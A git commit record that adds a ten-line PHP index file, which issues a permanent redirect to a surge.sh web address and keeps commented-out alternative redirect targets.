76b89269cc68062e9e21482796113d4f3b95c900
argeni5959 <67845811+argeni5959@users.noreply.github.com>
2020-08-23 23:18:40 -0400

    Create index.php

---
+++ index.php
@@ -0,0 +1,10 @@
+<?php
+Header( "HTTP/1.1 301 Moved Permanently" );
+
+//Header( "Location: http://gloverialismanterasas.blogspot.com/");
+
+
+Header( "Location: https://williredng-chair.surge.sh/");
+//Header( "Location: https://www.google.com");
+
+?>
